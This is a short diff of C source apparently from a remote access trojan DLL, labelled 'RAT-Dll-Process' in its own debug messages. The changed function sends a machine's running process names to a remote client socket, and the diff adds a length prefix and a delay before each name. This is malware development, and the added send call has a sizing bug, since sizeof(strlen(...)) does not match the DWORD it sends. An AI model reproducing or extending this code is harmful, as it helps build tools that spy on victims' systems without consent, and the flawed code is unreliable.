@@ -179,7 +179,7 @@ INT sendProcesses(SOCKET clientSock, char** processNames, DWORD* processPIDs, IN
 	INT status = SUCCESS;
 	CHAR msgBuf[DEFAULT_BUF_LEN];
 	char* process = NULL;
-	DWORD pid = 0;
+	DWORD pid = 0, filenameSize = 0;
 
 	for (int i = 0; i < numProcesses; i++)
 	{
@@ -188,6 +188,19 @@ INT sendProcesses(SOCKET clientSock, char** processNames, DWORD* processPIDs, IN
 
 		sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Sending process %s\n", process);
 		OutputDebugStringA(msgBuf);
+
+		Sleep(1000);
+
+		// Maybe send length of the string so we grab the correct number of bytes from the packet 
+		filenameSize = strlen(process);
+		status = send(clientSock, (const char*)&filenameSize, sizeof(strlen(process)), 0);
+		if (status == SOCKET_ERROR)
+		{
+			sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Failure recevied from send (process size %d) %d\n", filenameSize, WSAGetLastError());
+			OutputDebugStringA(msgBuf);
+			status = WSAGetLastError();
+			goto cleanup;
+		}
 
 		status = send(clientSock, process, strlen(process), 0);
 		if (status == SOCKET_ERROR)
